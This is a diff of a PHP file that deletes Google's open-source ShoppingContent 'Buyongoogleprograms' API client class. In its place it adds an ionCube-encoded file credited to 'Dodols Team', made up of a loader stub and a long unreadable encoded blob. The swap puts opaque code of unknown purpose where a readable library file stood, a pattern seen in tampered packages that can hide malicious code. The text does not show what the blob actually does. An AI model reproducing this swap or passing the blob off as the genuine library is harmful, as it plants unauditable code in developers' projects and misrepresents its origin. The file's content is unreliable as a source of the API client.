@@ -1,133 +1,72 @@
-<?php
-/*
- * Copyright 2014 Google Inc.
- *
- * Licensed under the Apache License, Version 2.0 (the "License"); you may not
- * use this file except in compliance with the License. You may obtain a copy of
- * the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
- * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
- * License for the specific language governing permissions and limitations under
- * the License.
- */
-
-namespace Google\Service\ShoppingContent\Resource;
-
-use Google\Service\ShoppingContent\ActivateBuyOnGoogleProgramRequest;
-use Google\Service\ShoppingContent\BuyOnGoogleProgramStatus;
-use Google\Service\ShoppingContent\OnboardBuyOnGoogleProgramRequest;
-use Google\Service\ShoppingContent\PauseBuyOnGoogleProgramRequest;
-use Google\Service\ShoppingContent\RequestReviewBuyOnGoogleProgramRequest;
-
-/**
- * The "buyongoogleprograms" collection of methods.
- * Typical usage is:
- *  <code>
- *   $contentService = new Google\Service\ShoppingContent(...);
- *   $buyongoogleprograms = $contentService->buyongoogleprograms;
- *  </code>
- */
-class Buyongoogleprograms extends \Google\Service\Resource
-{
-  /**
-   * Reactivates the BoG program in your Merchant Center account. Moves the
-   * program to the active state when allowed, e.g. when paused. Important: This
-   * method is only whitelisted for selected merchants.
-   * (buyongoogleprograms.activate)
-   *
-   * @param string $merchantId Required. The ID of the account.
-   * @param string $regionCode The program region code [ISO 3166-1
-   * alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2). Currently only US
-   * is available.
-   * @param ActivateBuyOnGoogleProgramRequest $postBody
-   * @param array $optParams Optional parameters.
-   */
-  public function activate($merchantId, $regionCode, ActivateBuyOnGoogleProgramRequest $postBody, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'regionCode' => $regionCode, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('activate', [$params]);
-  }
-  /**
-   * Retrieves a status of the BoG program for your Merchant Center account.
-   * (buyongoogleprograms.get)
-   *
-   * @param string $merchantId Required. The ID of the account.
-   * @param string $regionCode The Program region code [ISO 3166-1
-   * alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2). Currently only US
-   * is available.
-   * @param array $optParams Optional parameters.
-   * @return BuyOnGoogleProgramStatus
-   */
-  public function get($merchantId, $regionCode, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'regionCode' => $regionCode];
-    $params = array_merge($params, $optParams);
-    return $this->call('get', [$params], BuyOnGoogleProgramStatus::class);
-  }
-  /**
-   * Onboards the BoG program in your Merchant Center account. By using this
-   * method, you agree to the [Terms of Service](https://merchants.google.com/mc/t
-   * ermsofservice/transactions/US/latest). Calling this method is only possible
-   * if the authenticated account is the same as the merchant id in the request.
-   * Calling this method multiple times will only accept Terms of Service if the
-   * latest version is not currently signed. (buyongoogleprograms.onboard)
-   *
-   * @param string $merchantId Required. The ID of the account.
-   * @param string $regionCode The program region code [ISO 3166-1
-   * alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2). Currently only US
-   * is available.
-   * @param OnboardBuyOnGoogleProgramRequest $postBody
-   * @param array $optParams Optional parameters.
-   */
-  public function onboard($merchantId, $regionCode, OnboardBuyOnGoogleProgramRequest $postBody, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'regionCode' => $regionCode, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('onboard', [$params]);
-  }
-  /**
-   * Pauses the BoG program in your Merchant Center account. Important: This
-   * method is only whitelisted for selected merchants.
-   * (buyongoogleprograms.pause)
-   *
-   * @param string $merchantId Required. The ID of the account.
-   * @param string $regionCode The program region code [ISO 3166-1
-   * alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2). Currently only US
-   * is available.
-   * @param PauseBuyOnGoogleProgramRequest $postBody
-   * @param array $optParams Optional parameters.
-   */
-  public function pause($merchantId, $regionCode, PauseBuyOnGoogleProgramRequest $postBody, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'regionCode' => $regionCode, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('pause', [$params]);
-  }
-  /**
-   * Requests review and then activates the BoG program in your Merchant Center
-   * account for the first time. Moves the program to the REVIEW_PENDING state.
-   * Important: This method is only whitelisted for selected merchants.
-   * (buyongoogleprograms.requestreview)
-   *
-   * @param string $merchantId Required. The ID of the account.
-   * @param string $regionCode The program region code [ISO 3166-1
-   * alpha-2](https://en.wikipedia.org/wiki/ISO_3166-1_alpha-2). Currently only US
-   * is available.
-   * @param RequestReviewBuyOnGoogleProgramRequest $postBody
-   * @param array $optParams Optional parameters.
-   */
-  public function requestreview($merchantId, $regionCode, RequestReviewBuyOnGoogleProgramRequest $postBody, $optParams = [])
-  {
-    $params = ['merchantId' => $merchantId, 'regionCode' => $regionCode, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('requestreview', [$params]);
-  }
-}
-
-// Adding a class alias for backwards compatibility with the previous class name.
-class_alias(Buyongoogleprograms::class, 'Google_Service_ShoppingContent_Resource_Buyongoogleprograms');
+<?php //00551
+// --------------------------
+// Created by Dodols Team
+// --------------------------
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+HR+cPru+gmjxhIyiSl4+ABsEJ9jVQaT19cKi7+9cTl7OnHkJXVQWDfH0ogW6/kQwTzzoiBhGJbYN
+GCg9ey5xZ4fAAMSeJ2W53dZET/vYVgeAr0PdJ+gHrrsKt5LQlGwoa/GU54e2Aoddlb1toLUY3R/m
+HHotstEwzM6p0LYV4ubsQmZ/h65nszSWpbuSanWCLTQsrCbsWM2b4a02/2BTbWQ1lBVApCh+HsHj
+2jMMsoGQWnE/itfW/brDAhq9LeWbclF68hwVZpPuWSNpeYcsWJTCwxTAYZwxLkUtDV4cXS92LnkD
+9/H/9cyPq2RYjuU19L+LwEgL22B/m0wOaiiC1EK9E/eEeTnWDoWagFPAMhNS+NOIuivOPX6I2Cly
+S4xvNV1E+lZ9+SQbYEfGRGxV0F+0zwNdlzXnmuREcJBisQgod3kCZ/Q1vz2zTpHWIu9s1HmCjx00
+evGO+D+qkAyq8+80noHQ03HtsYRvec3VEfve0fz2+gSIka1eduUHDqz/YcUbvfakhQVAd9NZPvcw
+0lAbATZZZumxXHzxO0IgvVyjgsY2Dl+Pg1LnqPdY4JYpBzVEoulro3Em+fEjW95K/hKplhsFQ1gB
+qx9R+c9VtlFaWuhgwWQP6t7lK8AlH8VOULs+h4KcmlXKeUQ6bWgSdut35EZa7sS+JJGN5j91lv+m
+l8d+AIij4aKAwZbBqScygDLhtunDUrcqZkDEOKmUIj0IemB0gYVeEnOofZ/yZU4RZJZ7fi2ByFVp
+abER0t2RQbCVEfqPEO2kz5suxT9FHWSpYXHrTgXIDz2BwlIRIos2BIKn3YSMPxzgQlsh8VPUgC+T
+Ae7xYyv7mV0z5c3AqMb9VH741QqobmjJdSw/41Sm9l4Zb/Q7N7gcSqSTzWZmzY91JJspJGR0aaJE
+WtlPxt2YDQ+XuCB5cdJlvxOELfl3PX1C54puSVgEMhBLDzds7tJEXlK5AmKJJD/VvUNuoHmmHbOs
+c8FcClvs5Y7XJTSGw1eUPOs92IUbMICgICn72I1FnP+QWwv526TJ8jqjzcfOmSgoiwU0POgcosyO
+5vZBeRdoeoVYUMWQtUgeln5LwaEIqHOPpntkJgmO9zF7uCqSMed3JcVprmVQG0ELT5boxtCCA1uZ
+td1Eb2t2lU9LFu1hrRWOpD9Ru0JJDLkZKQ8ck5URw2O0OgGBaglXrrF8k9HpHSjgAw2mICjZo8ep
+bAJ6JPysHcMOojoMKlbkahkl72Kspu3vT3qXxIRRNIcinESdxCQhLHQb/J6JtTHvW7IWia4skmBP
+ZuHCEQroUiiWyPQtB4JWs3HcKMT2wrvsApum89sfX5ymrNykK/EDtdTDFgDH/WItlCpJiGofEnib
+NP3fuMiHQbbDNtdF4Dtg0xEcAQl6zDcBVJqrhUNwW4rsf4dH5wD85XsRLx4N4LiItRcnQjIFrfHE
+GCTFKluNI2V/qobVczN3cOxChurdUpsTDXAtFIa8T1B/Q8Dx/sqgs4UTpnhMhInSAY1MoyGpZNSY
++90tGpP74rn8DNwZXuVn27giwKEqIfVnmd1x0znV2MyYgJYlB67EyZSs89xb3tnX9nhqnCxz+cV+
+tNl7xug1oamlEJ0XEiSZ60q19vzSHhHqk2CMD3QpJffIPwf33ArRHtYI+jvY/tP1a3d++6ERyp9T
+v8l5bW11qQl8tTh8O8piSdv2Bx+xwyeaoinzFbliU1vtP8ct7YIBIWFs5CoAn1tiBm7JMqCB8fR+
+CmnI0QDOYG0k6OncHdlWxuIg/hXGbmg46+p+bZVJaNv5Z2mgNS+vnB85AUmmOAgdJQc5VJ0bVmHj
+IYYBiQ4alx6Eya+kCTCIyaatZskQMHjeJUASFK1OQpa2lKTKMwM+rYow1Vz51joLWgNbNLljZg+8
+6FjHRGGv70Dtq7l2cZFuLUQUzoBV291fCU+bBb2CVKycDyxiJ4J4UeQME6/fa587t74LRtMhtdpG
+MYmiBe5Y6giWa91wzXltPCOCzNL1VM7Eg+XZ+riJpcS3lx7i5+lzgieC/CdcH5PZfoTib5HQDdcT
+gpuEuXzphwQXbXtVES2Ffin1/u+P13frkTo1Cilo1bQsriThMU4KCzz4bMRljvYpTfcAb471PvuX
+8vSUXyT+ZxtgeLVJ3wG4WTN8tkeBG0nCkM3hbOVHiKhXKSs4QxyLnFWb8dvmeLUsUSWhC0C/zeK4
+8uMHlM85IFQO14rAR2jkoAgvIQ0varOmg0eDvXnzrK0qq8nmxDrdsnRWstFMczFRcGRw6cjSKuoL
+2eiQPx1J8M+tNApeeiGFkol+CVMUmT4zaQyS7X1VtRrXUHEvokBJnTkkpSCS3+3d84TdSYScgGSF
+MbZnk8ANUw7cJ0CL7F6o6u4Ia3uVh4BhD53K2ozMfnSxxOGQ6L9L3muQ9uIM77QG6I3z+F2I+/Zo
+/W4KIaCwiSyfkgKQ08W5xcS1ix7j+CMezZXKtcPuSE8YbuzgxMmD103VzhtOb/AxDX/muz8TU+3M
+76k1Bx6j5IoW8YgtvVCBCoSKkroXn/PJ1XomDIhE9DGU7x5ZQgoSTx1SzPuAoGOEtfPddNycolQs
+vt4ETrNiuK99V/jerJ48msJRyMwtblS6RjMEEw2sr43XuMiuU2bW6bZQU5bLcXpGcAU80ue+G5Ld
+PhIctJsLScJxsF4ZMu4itsBzinW/qwa35+2nXIpApXJZkzpC2PWk11rdrXzcqBHjTOQzIC52901W
+vhL9gm9pj6D7k9AjMe9R1VHSSB2oEFz2rCIzqtNGaCC4V4rQpMQc/IPu/tXJ9fliEsfI62wAMSiu
+fHgMewMdw4kr0PHRtrvqS0/X41ZL3y2/2vTh/50scT9nzmpp3yMfDSM2oKW+NXJmb2//3QOXkMH1
+C7HiflipWvB2JO7yvzEje+y4VY74lYGKiHdfk6XnZGzl+UcQD17J4dQuGYQW2Y44EFJ3cuAFHwCO
+Ng0555Tt/v2GTFSMIGm8zTFUw+3NUhQ5VN8696cm7GUeppTDBuntYztoZ0+ehDnbxmhBLvi66aZR
+Gz2KvOnTkACZ0hKYpDhKEIGVRH0sTDg9M+Fw+nJ8kE6QzLvrb5zGMygt7ivsdZ9/NyKT/zzn+03g
+zvxuOj9Be49KDl02YUEwVsTLHFTl0T1/1N1RH7WAohfxyTveg3xod2mST4Pfju2EAAgzS36m13dw
+AUNmO6pOxJehDyJ+VMyC09BiG7oLodaazyev8QterijLtFKHkqSDPUlSxDC4zuTOC1FuCE/gKCt+
+jrUpXuVEhh4H9UybPFsZ6M9tWDcBttWARqhFMja83bjX5yvqGc3Nez74sCmXooggiGwSBknALcre
+NqWKHTfEUNSHqn79GqC4GxLwwhMnIVJHdsWuXeDU6IiZ4sMcvQn2GCz5O5uL/4aGgclcRrvVX1m8
+RxLVNYyJeOYyOiLGKp2nzLkOEtrtYWCUZPfJBfpPh3+51dtCRENnKA7TmBrhO/4VKeho8tADWuH7
+2RoJQBnUPjZ93uUNAz4gRLUrTGyP+YtnBxjedz7szbhqjT/EjbdNRDt44b2bjskpUMdwoRiuTAkL
+6KiTrwrmRmX84EOQv6M2DXC/XDNH/OfAwau6VVcVmj6GyixB4Hz5HVNEZcTBiywVoMgx3jY02gc9
+q6CWj1VSDBi5UpOYC8PCM7f/crH+4AbwUUqUbl5lfB7QncA8wgUW0+cdplcLcyQ4UVEU6EIJZEXQ
+jFMufZ+GWLNJgiS7nVx4G9jeHrtc0YupWraiK++lmNOQ3QBKaKNLcK5PSD+9mQUO4/sA18kpAWHH
+VtsZHV/0CrcTigpz+tUnQj6VPRNLcVK4XMgJ3r6AOun5Vi4QuLWgCwyWqwHf81Y27AJMNmk2KAm0
+i+Er1/WA/fyYXJ35LzK5Ssjii7EzeChm9NxqCSya4iSKuvNMh/NgIbHQOBkQgRs9V8Vnm+xpBpBq
+cbvuIsPHfgLxyoWjoGcPnB0Ef+7VE0oPZCjOg2vdxmThZl+46OJjLUqB4ov/FKxsBi03ykRyQKiQ
+i8H2QU7UYRvAXA780M8J4hUlZDP2+BjCCRiIGqkb5ntZ1H5KEUaOWqRsZgR+oVT/B7tajYZBl0Fs
+agvbqd4oxYMBR/yBBeWOhg9i+3e4pXQrghceJwQkQ9at/ptDuWMFbpZzSL8buKM2xRsDHlr2ETRs
+RbIkWFHgvCjgxMtiYp+M4drESSSHs2qPBzfBR3zsX/UryhperWIrCfJiEixsozSgwEAFzwJ40nC3
+0I3WSDe9qRh0mYZzGlKL9Z37Db8bcyc37lEvvKuwfkhNRrGOeePM/rxxw1Pq87zdvUlgEYQ0rSMU
+pDPuIXVOT8uRKCUM+pCVdy2zdQric7oT+iZ08UMZj1pmKoZdjT+WRTQxgMxx3ptJ3ryp4HdaAfaL
+HPRCOtjkp5yMURViCb+7V84n6XXNUzeZXKM5fawj4xgeVxKT0mMTqnRo6jFJ92nTfDJfuRYwA68d
+RffG+md/b4Dx0aT+je/sUOPdD1Wn3apMnfTLyiD1bAoQbrqe8AvmFtoWREdVBsW1zsS1zMu/MJ2r
+DziVW1/coIqFbh/dPdxaaA9WKUp0ZFxpVRGxX+d3ZNpwZZEmj0MHW6uTErdfnElfU9BusmqBTD1L
+0WS1zeaNn+1mJ83o6y8PCTstDaUCoomIs8ClDW4UiiK33Tv0gpVKUwVQOMJzqL8T0wkPOnO+S5AM
+Tcv8zkF5OdtQBR+xL98AnQZbgfts1NbNs4cca4JJoBoTaf4fhgbJuAh8oh550JeiQCFXHOTirCK+
+ziXJ29wZKoCaUBgZdO8NvC0aHXZ4RwerZ+LWbKrI3x1TSKrlSEXCn+cdIo5m6q6oyHLCexWz2PVM
+Ooev3xz91q3YC5I7PwEIDtK4Yxo6/Seemin4ZBapGTbQPiU1uiOIGBjDGBL3hWIneo7q2SST6hW0
+nw/r
